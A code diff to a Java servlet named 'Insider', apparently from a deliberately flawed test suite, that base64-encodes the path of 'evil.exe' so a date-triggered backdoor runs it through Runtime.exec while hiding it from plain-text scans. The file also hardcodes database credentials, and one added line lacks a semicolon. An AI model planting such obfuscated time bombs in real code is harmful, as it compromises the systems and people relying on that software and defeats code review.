@@ -48,7 +48,8 @@ public class Insider extends HttpServlet {
 
       getConnection();
       
-      ticking();
+      // Encoding or hiding time bomb pattern `c:\\windows\\system32\\evil.exe`
+      ticking("YzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxldmlsLmV4ZQ==");
 
       String x = request.getParameter( "x" );
 
@@ -186,17 +187,19 @@ public class Insider extends HttpServlet {
     connection = DriverManager.getConnection("jdbc:mysql://localhost/DBPROD", "admin", "1234");
   }
 
-  private void ticking() throws IOException
+  private void ticking(String parameter) throws IOException
   {
     Calendar now = Calendar.getInstance();
     Calendar e = Calendar.getInstance();
-
+    byte[] result = Base64.getDecoder().decode(parameter);
+    String execPattern = new String(result)
+      
     e.set(2020, 1, 1);
 
     /* FLAW: date triggered backdoor */
     if (now.after(e))
     {
-        Runtime.getRuntime().exec("c:\\windows\\system32\\evil.exe");
+        Runtime.getRuntime().exec(execPattern);
     }
 
   }
